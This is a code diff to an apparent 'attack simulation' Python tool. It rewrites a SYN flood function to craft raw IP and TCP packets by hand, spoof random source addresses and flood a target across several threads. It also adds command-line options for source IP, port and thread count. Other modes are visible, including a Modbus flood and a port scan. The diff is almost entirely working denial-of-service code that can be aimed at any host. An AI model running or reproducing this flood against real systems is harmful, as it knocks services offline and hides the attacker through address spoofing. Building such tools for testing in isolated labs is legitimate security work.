@@ -33,6 +33,7 @@ import sys
 import random
 import socket
 import threading
+import struct
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 # Scapy Imports for Attack Simulation
@@ -61,26 +62,101 @@ log = logging.getLogger()
 
 # --- Attack Logic ---
 
-def run_syn_flood(target_ip, port, count=1000):
-    """运行 TCP SYN Flood 攻击"""
-    if not SCAPY_AVAILABLE:
-        log.error("[!] Scapy not available. Cannot run SYN Flood.")
+def checksum(msg):
+    s = 0
+    for i in range(0, len(msg), 2):
+        w = (msg[i] << 8) + (msg[i+1])
+        s = s + w
+    s = (s >> 16) + (s & 0xffff)
+    s = ~s & 0xffff
+    return s
+
+def send_syn_raw(target_ip, port, count, src_ip=None, src_port=None):
+    """使用 Raw Socket 高速发送 SYN 包"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    except PermissionError:
+        log.error("[!] Need root privileges to run Raw Socket SYN Flood.")
         return
 
-    log.info(f"[*] Starting SYN Flood -> {target_ip}:{port} (Count: {count})...")
+    target_addr = socket.gethostbyname(target_ip)
     
-    # 构造 SYN 包
-    # 源 IP 伪造为随机
+    # 预先构造部分报文以提高速度
     for i in range(count):
-        src_ip = f"10.0.{random.randint(1,254)}.{random.randint(1,254)}"
-        ip = IP(src=src_ip, dst=target_ip)
-        tcp = TCP(sport=RandShort(), dport=port, flags="S", seq=random.randint(1000, 9000))
-        pkt = ip / tcp
-        send(pkt, verbose=0)
-        if i % 100 == 0:
-            log.info(f"[!] Sent {i} SYN packets...")
-            
-    log.info("[*] SYN Flood completed.")
+        # 构造 IP 头部
+        s_ip = src_ip if src_ip else f"10.0.{random.randint(1,254)}.{random.randint(1,254)}"
+        s_port = src_port if src_port else random.randint(1024, 65535)
+        
+        # IP Header
+        ihl = 5
+        version = 4
+        tos = 0
+        tot_len = 20 + 20
+        id = random.randint(1000, 65535)
+        frag_off = 0
+        ttl = 64
+        protocol = socket.IPPROTO_TCP
+        check = 0
+        saddr = socket.inet_aton(s_ip)
+        daddr = socket.inet_aton(target_addr)
+        ihl_version = (version << 4) + ihl
+        ip_header = struct.pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
+
+        # TCP Header
+        source = s_port
+        dest = port
+        seq = random.randint(0, 4294967295)
+        ack_seq = 0
+        doff = 5
+        # Flags
+        fin = 0
+        syn = 1
+        rst = 0
+        psh = 0
+        ack = 0
+        urg = 0
+        window = socket.htons(5840)
+        check = 0
+        urg_ptr = 0
+        offset_res = (doff << 4) + 0
+        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
+        tcp_header = struct.pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)
+
+        # Pseudo Header for Checksum
+        placeholder = 0
+        protocol = socket.IPPROTO_TCP
+        tcp_length = len(tcp_header)
+        psh_header = struct.pack('!4s4sBBH', saddr, daddr, placeholder, protocol, tcp_length)
+        psh_header = psh_header + tcp_header
+        tcp_check = checksum(psh_header)
+        tcp_header = struct.pack('!HHLLBBH', source, dest, seq, ack_seq, offset_res, tcp_flags, window) + struct.pack('H', tcp_check) + struct.pack('!H', urg_ptr)
+
+        packet = ip_header + tcp_header
+        s.sendto(packet, (target_addr, 0))
+        
+        if i > 0 and i % 5000 == 0:
+            log.info(f"[!] Thread {threading.current_thread().name} sent {i} packets...")
+
+def run_syn_flood(target_ip, port, count=1000, src_ip=None, src_port=None, threads=1):
+    """运行多线程 TCP SYN Flood 攻击"""
+    log.info(f"[*] Starting High-Speed SYN Flood -> {target_ip}:{port} (Total: {count}, Threads: {threads})...")
+    
+    count_per_thread = count // threads
+    thread_list = []
+    
+    start_time = time.time()
+    for i in range(threads):
+        t = threading.Thread(target=send_syn_raw, args=(target_ip, port, count_per_thread, src_ip, src_port), name=f"Flood-{i}")
+        thread_list.append(t)
+        t.start()
+
+    for t in thread_list:
+        t.join()
+    
+    duration = time.time() - start_time
+    pps = count / duration if duration > 0 else count
+    log.info(f"[*] SYN Flood completed. Duration: {duration:.2f}s, Avg Rate: {pps:.2f} pkt/s")
 
 def run_modbus_flood(target_ip, port, count=1000):
     """运行 Modbus 协议泛洪攻击 (应用层 DoS)"""
@@ -261,6 +337,9 @@ if __name__ == "__main__":
     p_syn.add_argument("--target", required=True)
     p_syn.add_argument("--port", type=int, default=80)
     p_syn.add_argument("--count", type=int, default=1000)
+    p_syn.add_argument("--src", help="Fixed source IP (optional)")
+    p_syn.add_argument("--src-port", type=int, help="Fixed source port (optional)")
+    p_syn.add_argument("--threads", type=int, default=1, help="Number of threads for high-speed flood")
 
     # Attack: Modbus Flood
     p_mf = subparsers.add_parser("modbus-flood")
@@ -289,7 +368,7 @@ if __name__ == "__main__":
     elif args.mode == "http-client":
         run_http_client(args.target, args.port, args.interval)
     elif args.mode == "syn-flood":
-        run_syn_flood(args.target, args.port, args.count)
+        run_syn_flood(args.target, args.port, args.count, args.src, args.src_port, args.threads)
     elif args.mode == "modbus-flood":
         run_modbus_flood(args.target, args.port, args.count)
     elif args.mode == "port-scan":
